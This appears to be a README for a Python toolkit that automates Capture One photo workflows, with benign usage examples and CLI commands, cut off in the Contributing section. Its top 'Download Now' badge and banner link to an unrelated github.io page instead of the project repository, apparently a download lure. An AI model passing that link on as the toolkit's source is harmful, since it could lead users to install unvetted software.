# capture-one-toolkit

[![Download Now](https://img.shields.io/badge/Download_Now-Click_Here-brightgreen?style=for-the-badge&logo=download)](https://strikedata.github.io/capture-info-wjp/)


[![Banner](banner.png)](https://strikedata.github.io/capture-info-wjp/)


[![Python Version](https://img.shields.io/badge/python-3.8%2B-blue.svg)](https://www.python.org/downloads/)
[![License: MIT](https://img.shields.io/badge/License-MIT-yellow.svg)](https://opensource.org/licenses/MIT)
[![PyPI version](https://img.shields.io/badge/pypi-v0.4.2-orange.svg)](https://pypi.org/project/capture-one-toolkit/)
[![Platform](https://img.shields.io/badge/platform-Windows-lightgrey.svg)](https://www.captureone.com/)
[![Code style: black](https://img.shields.io/badge/code%20style-black-000000.svg)](https://github.com/psf/black)
[![Maintenance](https://img.shields.io/badge/Maintained%3F-yes-green.svg)](https://github.com/capture-one-toolkit/capture-one-toolkit/graphs/commit-activity)

> A Python automation and data-extraction toolkit for photographers and developers working with **Capture One on Windows** — streamline your photo processing pipelines, parse session/catalog metadata, and integrate Capture One workflows into larger Python-based systems.

---

## Table of Contents

- [Overview](#overview)
- [Features](#features)
- [Requirements](#requirements)
- [Installation](#installation)
- [Quick Start](#quick-start)
- [Usage Examples](#usage-examples)
- [Project Structure](#project-structure)
- [Contributing](#contributing)
- [License](#license)

---

## Overview

`capture-one-toolkit` is an open-source Python library designed to complement **Capture One for Windows** — one of the most widely used professional photography and RAW processing applications. The toolkit exposes programmatic interfaces for reading session structures, extracting EXIF/XMP metadata, automating batch export tasks, and monitoring output directories — all without modifying your Capture One installation or catalog integrity.

Whether you are a studio photographer automating delivery pipelines or a developer building integrations around Capture One's Windows-based workflow, this toolkit provides clean, testable Python abstractions on top of Capture One's file system conventions.

---

## Features

- 📁 **Session & Catalog Parser** — Read and traverse Capture One `.cosessiondb` and `.cocatalogdb` structures to enumerate images, albums, and variants programmatically.
- 🖼️ **Metadata Extraction** — Extract embedded EXIF, IPTC, and XMP sidecar data from RAW files managed by Capture One on Windows.
- ⚙️ **Batch Processing Automation** — Trigger and monitor Capture One's headless export scripts via subprocess wrappers with structured logging.
- 📊 **Workflow Analytics** — Analyze shot-to-export ratios, color grading statistics, and capture timestamps across large sessions.
- 🔔 **Directory Watcher** — File-system event hooks that react to Capture One output folder changes in real time using `watchdog`.
- 🔄 **XMP Sidecar Read/Write** — Parse and update `.xmp` sidecar files associated with Capture One variants without touching the catalog.
- 🗂️ **Export Manifest Generator** — Automatically produce JSON/CSV manifests of exported assets including file paths, dimensions, and color profiles.
- 🧩 **Plugin-Ready Architecture** — Extend the toolkit with custom processors using a simple hook registration pattern.

---

## Requirements

| Requirement        | Version / Notes                                  |
|--------------------|--------------------------------------------------|
| Python             | 3.8 or higher                                    |
| Operating System   | Windows 10 / Windows 11 (primary support)        |
| Capture One        | 21, 22, 23 (session and catalog formats tested)  |
| `exifread`         | `>= 2.3.2` — EXIF parsing from RAW files         |
| `lxml`             | `>= 4.9.0` — XMP sidecar XML processing         |
| `watchdog`         | `>= 3.0.0` — Real-time directory monitoring      |
| `click`            | `>= 8.1.0` — CLI interface                       |
| `pydantic`         | `>= 2.0.0` — Data validation and session models  |
| `rich`             | `>= 13.0.0` — Terminal output formatting         |

---

## Installation

### From PyPI

```bash
pip install capture-one-toolkit
```

### From Source

```bash
# Clone the repository
git clone https://github.com/capture-one-toolkit/capture-one-toolkit.git
cd capture-one-toolkit

# Create and activate a virtual environment (recommended)
python -m venv .venv
.venv\Scripts\activate        # Windows

# Install in editable mode with development dependencies
pip install -e ".[dev]"
```

### Verify Installation

```bash
python -c "import capture_one_toolkit; print(capture_one_toolkit.__version__)"
# Expected output: 0.4.2
```

---

## Quick Start

```python
from capture_one_toolkit import SessionReader, MetadataExtractor

# Point the reader at an existing Capture One session folder on Windows
session = SessionReader(r"C:\Users\photographer\Pictures\MySession")

# Print basic session info
print(session.name)          # "MySession"
print(session.image_count)   # 342
print(session.created_at)    # datetime(2024, 3, 15, 10, 30, 0)

# Extract metadata from every RAW file in the session
extractor = MetadataExtractor(session)
for image in extractor.iter_images():
    print(image.filename, image.camera_model, image.iso, image.focal_length)
```

---

## Usage Examples

### 1. Parsing a Capture One Session

```python
from capture_one_toolkit import SessionReader
from pathlib import Path

session_path = Path(r"C:\PhotoProjects\ClientShoot_2024")
session = SessionReader(session_path)

# Iterate over all albums and their variant counts
for album in session.albums:
    print(f"Album: {album.name!r} | Images: {album.image_count} | Rated: {album.rated_count}")

# Filter to only five-star selects
selects = [img for img in session.images if img.rating == 5]
print(f"Total selects: {len(selects)}")
```

---

### 2. Extracting and Analyzing EXIF Metadata

```python
from capture_one_toolkit import MetadataExtractor, SessionReader
import statistics

session = SessionReader(r"C:\PhotoProjects\StudioSession")
extractor = MetadataExtractor(session)

iso_values = []
for image in extractor.iter_images(extensions=[".cr3", ".arw", ".nef"]):
    meta = image.exif
    if meta.iso:
        iso_values.append(meta.iso)
    print(
        f"{image.filename}: "
        f"ISO={meta.iso}, "
        f"Shutter={meta.shutter_speed}, "
        f"Aperture=f/{meta.aperture}, "
        f"Lens={meta.lens_model!r}"
    )

print(f"\nMedian ISO across session: {statistics.median(iso_values):.0f}")
print(f"Max ISO: {max(iso_values)} | Min ISO: {min(iso_values)}")
```

---

### 3. Reading and Writing XMP Sidecar Files

```python
from capture_one_toolkit.xmp import XMPSidecarHandler
from pathlib import Path

sidecar_path = Path(r"C:\PhotoProjects\Session\CaptureOne\Settings115\IMG_0042.xmp")

handler = XMPSidecarHandler(sidecar_path)

# Read current adjustments stored by Capture One
adjustments = handler.read_adjustments()
print(f"Exposure: {adjustments.exposure}")
print(f"White Balance: {adjustments.white_balance}")
print(f"Color Grade: {adjustments.color_grade_mode}")

# Apply a programmatic keyword tag without opening Capture One
handler.add_keyword("reviewed")
handler.add_keyword("client-approved")
handler.save()

print("XMP sidecar updated successfully.")
```

---

### 4. Watching a Capture One Export Folder

```python
from capture_one_toolkit.watcher import ExportWatcher
import logging

logging.basicConfig(level=logging.INFO)

def on_new_export(event):
    """Called whenever Capture One writes a new file to the export directory."""
    print(f"New export detected: {event.filepath.name}")
    print(f"  Size   : {event.file_size_mb:.2f} MB")
    print(f"  Profile: {event.color_profile}")
    # Trigger downstream steps — upload to cloud, notify client, etc.

watcher = ExportWatcher(
    watch_dir=r"C:\PhotoProjects\ClientShoot_2024\Exports",
    callback=on_new_export,
    file_extensions=[".jpg", ".tif"],
)

print("Watching for new Capture One exports... (Ctrl+C to stop)")
watcher.start()
```

---

### 5. Generating an Export Manifest

```python
from capture_one_toolkit import ManifestGenerator
from pathlib import Path

export_dir = Path(r"C:\PhotoProjects\ClientShoot_2024\Exports")
output_path = Path(r"C:\PhotoProjects\ClientShoot_2024\manifest.json")

gen = ManifestGenerator(export_dir)
manifest = gen.build(include_dimensions=True, include_color_profile=True)

# Save as structured JSON for downstream delivery systems
gen.save_json(output_path)
print(f"Manifest written: {output_path}")
print(f"  Total files : {manifest.total_files}")
print(f"  Total size  : {manifest.total_size_mb:.1f} MB")
print(f"  Profiles    : {manifest.unique_color_profiles}")
```

---

### 6. CLI Usage

The toolkit ships with a command-line interface for quick operations without writing a script:

```bash
# Summarize a Capture One session
co-toolkit session summarize "C:\PhotoProjects\ClientShoot_2024"

# Export a metadata CSV from a session
co-toolkit metadata export "C:\PhotoProjects\ClientShoot_2024" --output metadata.csv

# Watch an export directory and log new files
co-toolkit watch "C:\PhotoProjects\ClientShoot_2024\Exports" --extensions jpg tif

# Validate all XMP sidecars in a session for schema conformance
co-toolkit xmp validate "C:\PhotoProjects\ClientShoot_2024"
```

---

## Project Structure

```
capture-one-toolkit/
├── capture_one_toolkit/
│   ├── __init__.py
│   ├── session.py          # SessionReader and catalog models
│   ├── metadata.py         # MetadataExtractor, EXIF/IPTC parsing
│   ├── xmp.py              # XMPSidecarHandler for reading/writing sidecars
│   ├── watcher.py          # ExportWatcher using watchdog
│   ├── manifest.py         # ManifestGenerator for export inventories
│   ├── models.py           # Pydantic data models (Image, Album, Adjustment)
│   ├── cli.py              # Click-based CLI entry point
│   └── utils.py            # Shared helpers and path utilities
├── tests/
│   ├── fixtures/           # Sample session stubs and mock XMP files
│   ├── test_session.py
│   ├── test_metadata.py
│   ├── test_xmp.py
│   └── test_watcher.py
├── docs/
│   └── usage.md
├── pyproject.toml
├── CHANGELOG.md
└── README.md
```

---

## Contributing

Contributions are welcome and appreciated. Please follow these steps